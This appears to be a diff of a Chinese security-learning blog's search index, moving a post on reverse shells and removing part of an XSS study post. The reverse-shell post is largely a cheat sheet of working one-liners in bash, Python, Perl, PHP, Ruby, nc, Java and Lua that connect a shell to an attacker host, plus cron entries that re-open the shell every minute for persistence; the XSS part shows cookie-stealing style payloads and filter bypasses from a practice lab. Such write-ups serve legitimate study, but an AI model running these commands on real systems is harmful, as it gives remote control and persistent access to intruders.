-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php -&#39;exec(&quot;&#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port&quot;)&#39;</span><br></pre></td></tr></table></figure>
-<p>但是没有成功</p>
-<p> 之前乌云知识库上的一个姿势，使用php的fsockopen去连接远程：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php -r &#39;$sock&#x3D;fsockopen(&quot;ip&quot;,port);exec(&quot;&#x2F;bin&#x2F;bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span><br></pre></td></tr></table></figure>
-
-
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1623311000363-c37aba29-3a5d-4a03-b086-93ac4b0df42b.png" alt="img"></p>
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1623310925650-41688ec7-49d7-4aea-9b28-012b0c4afcb2.png" alt="img"></p>
-<h3 id="附上国外大佬整理的各种版本的shell写法"><a href="#附上国外大佬整理的各种版本的shell写法" class="headerlink" title="附上国外大佬整理的各种版本的shell写法"></a>附上国外大佬整理的各种版本的shell写法</h3><p><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#bash版本：</span><br><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.0.0.1&#x2F;8080 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">#perl版本:</span><br><span class="line">perl -e &#39;use Socket;$i&#x3D;&quot;10.0.0.1&quot;;$p&#x3D;1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;sh -i&quot;);&#125;;&#39;</span><br><span class="line"></span><br><span class="line">#python版本：</span><br><span class="line">python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39;</span><br><span class="line"></span><br><span class="line">#php版本：</span><br><span class="line">php -r &#39;$sock&#x3D;fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span><br><span class="line"></span><br><span class="line">#ruby版本：</span><br><span class="line">ruby -rsocket -e&#39;f&#x3D;TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#39;</span><br><span class="line"></span><br><span class="line">#nc版本：</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;nc版本正确，存在-e选项就能直接反弹shell</span><br><span class="line">nc -e &#x2F;bin&#x2F;sh 10.0.0.1 1234 </span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;不存在-e选项</span><br><span class="line">rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;&#x2F;tmp&#x2F;f</span><br><span class="line"></span><br><span class="line">nc x.x.x.x 8888|&#x2F;bin&#x2F;sh|nc x.x.x.x 9999</span><br><span class="line"></span><br><span class="line">#java版本</span><br><span class="line">r &#x3D; Runtime.getRuntime()</span><br><span class="line">p &#x3D; r.exec([&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;10.0.0.1&#x2F;2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])</span><br><span class="line">p.waitFor()</span><br><span class="line"></span><br><span class="line">#lua</span><br><span class="line">lua -e &quot;require(&#39;socket&#39;);require(&#39;os&#39;);t&#x3D;socket.tcp();t:connect(&#39;10.0.0.1&#39;,&#39;1234&#39;);os.execute(&#39;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#39;);&quot;</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="powershell反弹shell的方法"><a href="#powershell反弹shell的方法" class="headerlink" title="powershell反弹shell的方法"></a>powershell反弹shell的方法</h2><p>测试环境说明</p>
-<p>攻击者：kali2020.03 64位 192.168.229.129</p>
-<p>靶机：win7 x64 192.168.229.134</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1623318265542-562f9432-6581-422d-89ef-d854d7a3feb0.png" alt="img"></p>
-<p>emmm暂时先鸽了</p>
-<h2 id="其他反弹shell的方式"><a href="#其他反弹shell的方式" class="headerlink" title="其他反弹shell的方式"></a>其他反弹shell的方式</h2><p><a href="https://mp.weixin.qq.com/s?__biz=MzkxNDEwMDA4Mw==&mid=2247483867&idx=1&sn=ac1c105241c071190fae3d18938e9189&chksm=c172dbc7f60552d1e0e0dd5a23d71e00e6472ba344088c6811a7c426a2cf08cfc2af0ba06a80&scene=178&cur_album_id=1555994601520431105#rd">利用ICMP(icmpsh)协议反弹Shell</a></p>
-<h2 id="简单总结一下反弹shell失败可能得原因"><a href="#简单总结一下反弹shell失败可能得原因" class="headerlink" title="简单总结一下反弹shell失败可能得原因"></a>简单总结一下反弹shell失败可能得原因</h2><ul>
-<li>禁止出站ip（只允许访问特定ip）</li>
-<li>禁止出站端口（只允许访问特定端口）</li>
-<li>禁止出站协议(只允许特定协议，如icmp、dns、http)</li>
-<li>反弹命令不存在或是当前用户无权调用bash</li>
-<li>可能不是使用的bash、而是sh或其他</li>
-</ul>
-<p><a href="https://blog.csdn.net/qq_36119192/article/details/105906432">反弹shell失败的几种原因</a></p>
-<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.freebuf.com/articles/system/178150.html">linux下几种反弹shell方法的总结与理解</a></p>
-<p><a href="https://www.anquanke.com/post/id/99793">powershell反弹shell常见方式</a></p>
-<p><a href="https://www.jianshu.com/p/06f7cda74b84">Linux定时计划反弹shell</a></p>
-]]></content>
-  </entry>
-  <entry>
     <title>内网环境搭建</title>
     <url>/2021/07/15/%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
     <content><![CDATA[<h1 id="基本内网环境搭建"><a href="#基本内网环境搭建" class="headerlink" title="基本内网环境搭建"></a>基本内网环境搭建</h1><h3 id="网络拓扑"><a href="#网络拓扑" class="headerlink" title="网络拓扑"></a>网络拓扑</h3><p>用的思科模拟器画的，连接的方法肯定有问题，也没有连通，只能大概了解（学会了一定改）</p>
@@ -1598,6 +1515,102 @@
       </tags>
   </entry>
   <entry>
+    <title>反弹shell学习</title>
+    <url>/2021/06/24/%E5%8F%8D%E5%BC%B9shell%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[<h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><h2 id="linux下反弹shell的几种方法"><a href="#linux下反弹shell的几种方法" class="headerlink" title="linux下反弹shell的几种方法"></a>linux下反弹shell的几种方法</h2><p>测试环境说明</p>
+<p>攻击者：kali2020.03 64位 192.168.229.129</p>
+<p>靶机：kali2018 192.168.229.130</p>
+<p><a href="https://www.freebuf.com/articles/system/178150.html">https://www.freebuf.com/articles/system/178150.html</a></p>
+<h3 id="bash-反弹"><a href="#bash-反弹" class="headerlink" title="bash 反弹"></a>bash 反弹</h3><p>反弹shell的命令</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p>开启监听端口</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvp port</span><br></pre></td></tr></table></figure>
+<p>受害机上使用</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p>解释：</p>
+<ul>
+<li>bash -i代表在本地打开一个bash</li>
+<li>/dev/tcp/ip/port， /dev/tcp/是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接</li>
+<li>&amp;后面跟上/dev/tcp/ip/port这个文件代表将标准输出和标准错误输出重定向到这个文件，也就是传递到远程上，如果远程开启了对应的端口去监听，就会接收到这个bash的标准输出和标准错误输出</li>
+<li>加上0&gt;&amp;1，代表将标准输入重定向到标准输出，这里的标准输出已经重定向到了/dev/tcp/ip/port这个文件，也就是远程，那么标准输入也就重定向到了远程，这样的话就可以直接在远程输入了</li>
+</ul>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1623305370591-81a7de94-5ef7-4df9-afb8-ca230297e390.png" alt="img"></p>
+<h3 id="python-反弹"><a href="#python-反弹" class="headerlink" title="python 反弹"></a>python 反弹</h3><p>反弹shell的命令变为</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &quot;import os,socket,subprocess;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;ip&#39;,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-i&#39;]);&quot;</span><br></pre></td></tr></table></figure>
+
+
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1623305501499-5f0540e6-7b0f-40f4-940a-4082513732f0.png" alt="img"></p>
+<h3 id="nc-反弹"><a href="#nc-反弹" class="headerlink" title="nc 反弹"></a>nc 反弹</h3><p>条件是靶机上有nc</p>
+<p>尝试两种方法后都莫有成功</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvp port</span><br><span class="line"></span><br><span class="line">nc -e &#x2F;bin&#x2F;sh ip port </span><br><span class="line">-e后面跟的参数代表的是在创建连接后执行的程序，这里代表在连接到远程后可以在远程执行一个本地shell(&#x2F;bin&#x2F;bash)，也就是反弹一个shell给远程</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1623307363295-39c15dae-1953-4fa5-9734-4a9cd7b14533.png" alt="img"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1623307406531-927cfb8d-dfef-47f4-ae92-b22f6432bed7.png" alt="img"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -nvlp port</span><br><span class="line">nc -nvlp port</span><br><span class="line">nc ip port|&#x2F;bin&#x2F;bash|ip port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">使用nc监听端口反弹shell时可能会有一个警告：</span><br><span class="line">Warning: forward host lookup failed for bogon: Unknown host,</span><br><span class="line">根据nc帮助文档的提示加上-n参数就可以不产生这个警告了</span><br><span class="line">-n参数代表在建立连接之前不对主机进行dns解析</span><br></pre></td></tr></table></figure>
+
+
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1623307323674-b71ca629-7869-4534-ab4e-3feb9986cfd7.png" alt="img"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1623307242554-99df599d-d6cf-4913-8fde-69cd68b76c2d.png" alt="img"></p>
+<h3 id="定时计划反弹shell"><a href="#定时计划反弹shell" class="headerlink" title="定时计划反弹shell"></a>定时计划反弹shell</h3><ol>
+<li><code>crontab -e</code>直接写入</li>
+</ol>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">* * * * *  bash -i &gt;&amp; /dev/tcp/ip/8888 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+
+<p><img src="https://s2.loli.net/2021/12/07/UqMAvptbo85mygr.png" alt="image-20211207163655912"></p>
+<ol start="2">
+<li>创建shell文件，然后通过<code>crontab -e</code>写入</li>
+</ol>
+<p>ps</p>
+<blockquote>
+<p>在<code>/etc/crontabshell</code>下写入</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/IP/8888  0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>然后<code>crontab -e</code>写入</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">* * * * * /etc/crontabshell</span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li>写入到crontab定时任务所在位置<code>/var/spool/cron/root</code></li>
+</ol>
+</blockquote>
+<p><code>echo &#39;* * * * * bash -i &gt;&amp; /dev/tcp/监听该机器的ip/8888 0&gt;&amp;1&#39; &gt;&gt; /var/spool/cron/root</code></p>
+<p><img src="https://s2.loli.net/2021/12/08/wOlGUE86IY3h5nx.png" alt="image-20211208190403710"></p>
+<p><code>nc -lvp 8888</code></p>
+<p><img src="https://s2.loli.net/2021/12/08/lgsAU68iCHxk2M3.png" alt="image-20211208190249253"></p>
+<p><a href="https://www.jianshu.com/p/06f7cda74b84">Linux定时计划反弹shell</a></p>
+<h3 id="php-反弹"><a href="#php-反弹" class="headerlink" title="php 反弹"></a>php 反弹</h3><p>注意php反弹shell的这些方法都需要php关闭safe_mode这个选项，才可以使用exec函数  </p>
+<p>默认的php.ini文件中没有打开安全模式</p>
+<p>使用php的exec函数执行反弹shell的命令</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php -&#39;exec(&quot;&#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port&quot;)&#39;</span><br></pre></td></tr></table></figure>
+<p>但是没有成功</p>
+<p> 之前乌云知识库上的一个姿势，使用php的fsockopen去连接远程：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php -r &#39;$sock&#x3D;fsockopen(&quot;ip&quot;,port);exec(&quot;&#x2F;bin&#x2F;bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span><br></pre></td></tr></table></figure>
+
+
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1623311000363-c37aba29-3a5d-4a03-b086-93ac4b0df42b.png" alt="img"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1623310925650-41688ec7-49d7-4aea-9b28-012b0c4afcb2.png" alt="img"></p>
+<h3 id="附上国外大佬整理的各种版本的shell写法"><a href="#附上国外大佬整理的各种版本的shell写法" class="headerlink" title="附上国外大佬整理的各种版本的shell写法"></a>附上国外大佬整理的各种版本的shell写法</h3><p><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#bash版本：</span><br><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.0.0.1&#x2F;8080 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">#perl版本:</span><br><span class="line">perl -e &#39;use Socket;$i&#x3D;&quot;10.0.0.1&quot;;$p&#x3D;1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;sh -i&quot;);&#125;;&#39;</span><br><span class="line"></span><br><span class="line">#python版本：</span><br><span class="line">python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39;</span><br><span class="line"></span><br><span class="line">#php版本：</span><br><span class="line">php -r &#39;$sock&#x3D;fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span><br><span class="line"></span><br><span class="line">#ruby版本：</span><br><span class="line">ruby -rsocket -e&#39;f&#x3D;TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#39;</span><br><span class="line"></span><br><span class="line">#nc版本：</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;nc版本正确，存在-e选项就能直接反弹shell</span><br><span class="line">nc -e &#x2F;bin&#x2F;sh 10.0.0.1 1234 </span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;不存在-e选项</span><br><span class="line">rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;&#x2F;tmp&#x2F;f</span><br><span class="line"></span><br><span class="line">nc x.x.x.x 8888|&#x2F;bin&#x2F;sh|nc x.x.x.x 9999</span><br><span class="line"></span><br><span class="line">#java版本</span><br><span class="line">r &#x3D; Runtime.getRuntime()</span><br><span class="line">p &#x3D; r.exec([&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;10.0.0.1&#x2F;2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])</span><br><span class="line">p.waitFor()</span><br><span class="line"></span><br><span class="line">#lua</span><br><span class="line">lua -e &quot;require(&#39;socket&#39;);require(&#39;os&#39;);t&#x3D;socket.tcp();t:connect(&#39;10.0.0.1&#39;,&#39;1234&#39;);os.execute(&#39;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#39;);&quot;</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="powershell反弹shell的方法"><a href="#powershell反弹shell的方法" class="headerlink" title="powershell反弹shell的方法"></a>powershell反弹shell的方法</h2><p>测试环境说明</p>
+<p>攻击者：kali2020.03 64位 192.168.229.129</p>
+<p>靶机：win7 x64 192.168.229.134</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1623318265542-562f9432-6581-422d-89ef-d854d7a3feb0.png" alt="img"></p>
+<p>emmm暂时先鸽了</p>
+<h2 id="其他反弹shell的方式"><a href="#其他反弹shell的方式" class="headerlink" title="其他反弹shell的方式"></a>其他反弹shell的方式</h2><p><a href="https://mp.weixin.qq.com/s?__biz=MzkxNDEwMDA4Mw==&mid=2247483867&idx=1&sn=ac1c105241c071190fae3d18938e9189&chksm=c172dbc7f60552d1e0e0dd5a23d71e00e6472ba344088c6811a7c426a2cf08cfc2af0ba06a80&scene=178&cur_album_id=1555994601520431105#rd">利用ICMP(icmpsh)协议反弹Shell</a></p>
+<h2 id="简单总结一下反弹shell失败可能得原因"><a href="#简单总结一下反弹shell失败可能得原因" class="headerlink" title="简单总结一下反弹shell失败可能得原因"></a>简单总结一下反弹shell失败可能得原因</h2><ul>
+<li>禁止出站ip（只允许访问特定ip）</li>
+<li>禁止出站端口（只允许访问特定端口）</li>
+<li>禁止出站协议(只允许特定协议，如icmp、dns、http)</li>
+<li>反弹命令不存在或是当前用户无权调用bash</li>
+<li>可能不是使用的bash、而是sh或其他</li>
+</ul>
+<p><a href="https://blog.csdn.net/qq_36119192/article/details/105906432">反弹shell失败的几种原因</a></p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.freebuf.com/articles/system/178150.html">linux下几种反弹shell方法的总结与理解</a></p>
+<p><a href="https://www.anquanke.com/post/id/99793">powershell反弹shell常见方式</a></p>
+<p><a href="https://www.jianshu.com/p/06f7cda74b84">Linux定时计划反弹shell</a></p>
+]]></content>
+  </entry>
+  <entry>
     <title>常见web漏洞学习之CSRF</title>
     <url>/2021/07/14/%E5%B8%B8%E8%A7%81web%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BCSRF/</url>
     <content><![CDATA[<h1 id="csrf学习"><a href="#csrf学习" class="headerlink" title="csrf学习"></a>csrf学习</h1><p>跨站请求伪造</p>
@@ -1640,78 +1653,6 @@
       </categories>
       <tags>
         <tag>csrf</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>常见web漏洞学习之xss学习</title>
-    <url>/2021/07/11/%E5%B8%B8%E8%A7%81web%E6%BC%8F%E6%B4%9E%E4%B9%8Bxss%E5%AD%A6%E4%B9%A0/</url>
-    <content><![CDATA[<h1 id="常见web漏洞学习之xss学习"><a href="#常见web漏洞学习之xss学习" class="headerlink" title="常见web漏洞学习之xss学习"></a>常见web漏洞学习之xss学习</h1><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><blockquote>
-<p>跨站脚本攻击，就是将恶意代码嵌入到前端js代码中（反射型，DOM型）或是数据库中（存储型）当用户点击或访问就会触发xss代码执行，盗取用户cookies或session</p>
-</blockquote>
-<p>要注意的是可能存在浏览器的影响，会阻止js代码执行</p>
-<h3 id="测试流程"><a href="#测试流程" class="headerlink" title="测试流程"></a>测试流程</h3><ol>
-<li>找到注入点</li>
-<li>输入一组“特殊字符+唯一标识字符”，查看返回结果</li>
-<li>源码找到唯一标识字符，判断是否可以构造闭合</li>
-<li>结合绕过方式，执行</li>
-</ol>
-<h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><p>反射型，存储型，DOM型</p>
-<p>简单来说，反射型就是构造的恶意代码由于过滤不严格，使得嵌入到前端js页面中进行执行</p>
-<p>玩玩<code>pikachu</code>靶场</p>
-<h4 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h4><p>输入长度被限制了，先将文本框的最大限制<code>20</code>改大些</p>
-<p><img src="/2021/07/11/%E5%B8%B8%E8%A7%81web%E6%BC%8F%E6%B4%9E%E4%B9%8Bxss%E5%AD%A6%E4%B9%A0/Users\王\AppData\Roaming\Typora\typora-user-images\image-20210713160014148.png" alt="image-20210713160014148"></p>
-<p>以get方式提交的，可以直接在url中看到提交的xss</p>
-<p><img src="https://i.loli.net/2021/07/13/gGnOdl3j4VwhCYT.png" alt="image-20210713160325433"></p>
-<p><code>who is ,i don&#39;t care!</code></p>
-<p><img src="https://i.loli.net/2021/07/13/LzoJMXOQ5m1EDsH.png" alt="image-20210713162302066"></p>
-<p>看一下源码</p>
-<p><img src="https://i.loli.net/2021/07/13/yrfeQIFUT2hazOJ.png" alt="image-20210713162627176"></p>
-<h4 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h4><p>payload</p>
-<p><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p>
-<p><img src="/2021/07/11/%E5%B8%B8%E8%A7%81web%E6%BC%8F%E6%B4%9E%E4%B9%8Bxss%E5%AD%A6%E4%B9%A0/Users\王\AppData\Roaming\Typora\typora-user-images\image-20210714152233253.png" alt="image-20210714152233253"></p>
-<p><img src="/2021/07/11/%E5%B8%B8%E8%A7%81web%E6%BC%8F%E6%B4%9E%E4%B9%8Bxss%E5%AD%A6%E4%B9%A0/Users\王\AppData\Roaming\Typora\typora-user-images\image-20210714152544701.png" alt="image-20210714152544701"></p>
-<p>其他用户访问也会触发</p>
-<p>kali</p>
-<p><img src="https://i.loli.net/2021/07/14/Kn5ljP8gRMEQXGd.png" alt="image-20210714153107662"></p>
-<h5 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h5><p>反射型数据交互只和前端js代码，没有进行存储，而存储型则是被写入到了后端，其他用户访问也会中招</p>
-<h4 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h4><p>那什么是dom呢？简单来说dom就是通过层次分明的结果组织，来展示HTML标签抽象成代码里的对象，可以管理文档，增删改查规则，是一个HTML标准接口</p>
-<blockquote>
-<p>在网站页面中有许多页面的元素，当页面到达浏览器时浏览器会为页面创建一个顶级的Document object文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过JS脚本对文档对象进行编辑从而修改页面的元素。也就是说，客户端的脚本程序可以通过DOM来动态修改页面内容，从客户端获取DOM中的数据并在本地执行。基于这个特性，就可以利用JS脚本来实现XSS漏洞的利用</p>
-</blockquote>
-<p><img src="https://i.loli.net/2021/07/14/6UWiEYVygrubAkd.png" alt="image-20210714105849246"></p>
-<p>而dom型xss用一个例子来讲就是，页面中的”下一页按钮”点击之后并没有url的改变也就是参数没变，而是通过HTML代码中的dom来执行的</p>
-<p>输入特殊字符<code>&#39;&lt;&quot;&gt;666</code>被过滤为<code>666</code></p>
-<p><img src="https://i.loli.net/2021/07/14/vJkDzx3IaYmSFUK.png" alt="image-20210714120425068"></p>
-<p>查看源码</p>
-<p><img src="https://i.loli.net/2021/07/14/oj1wcUOyntbJMSN.png" alt="image-20210714120824574"></p>
-<p>结合源码构造payload效果为点击弹窗</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;a href&#x3D;&#39;#&#39; onclick&#x3D;&quot;alert(&#39;xss&#39;)&quot;&gt;&#39;&gt;就让往事都随风,都随风吧&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>
-<p>payload</p>
-<p><code>#&#39; onclick=&quot;alert(&#39;xss&#39;)&quot;&gt;</code></p>
-<p>点击<code>&#39;&gt;就让往事都随风,都随风吧</code></p>
-<p><img src="https://i.loli.net/2021/07/14/J84TmvBj1bE2lQR.png" alt="image-20210714151950066"></p>
-<h3 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h3><h4 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h4><p>贴一段师傅源码</p>
-<p>区分大小写过滤<code>&lt;script&gt;</code>标签</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">//前端 1.html：</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>反射型XSS<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;action4.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">//后端 action4.php：</span><br><span class="line">&lt;?php</span><br><span class="line">$name=$_POST[&quot;name&quot;]; </span><br><span class="line">if($name!=null)&#123;</span><br><span class="line">	$name=preg_replace(&quot;/<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="handlebars"><span class="xml">/&quot;,&quot;&quot;,$name);      //过滤<span class="tag">&lt;<span class="name">script</span>&gt;</span></span></span></span><br><span class="line"><span class="javascript">	$name=preg_replace(<span class="string">&quot;/&lt;\/script&gt;/&quot;</span>,<span class="string">&quot;&quot;</span>,$name);   <span class="comment">//过滤</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">	echo $name; </span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<h4 id="嵌套-lt-script-gt-标签绕过"><a href="#嵌套-lt-script-gt-标签绕过" class="headerlink" title="嵌套&lt;script&gt;标签绕过"></a>嵌套<code>&lt;script&gt;</code>标签绕过</h4><p>其他源码同上，加了一个<code>i</code>，不区分大小写过滤<code>&lt;script&gt;</code>标签</p>
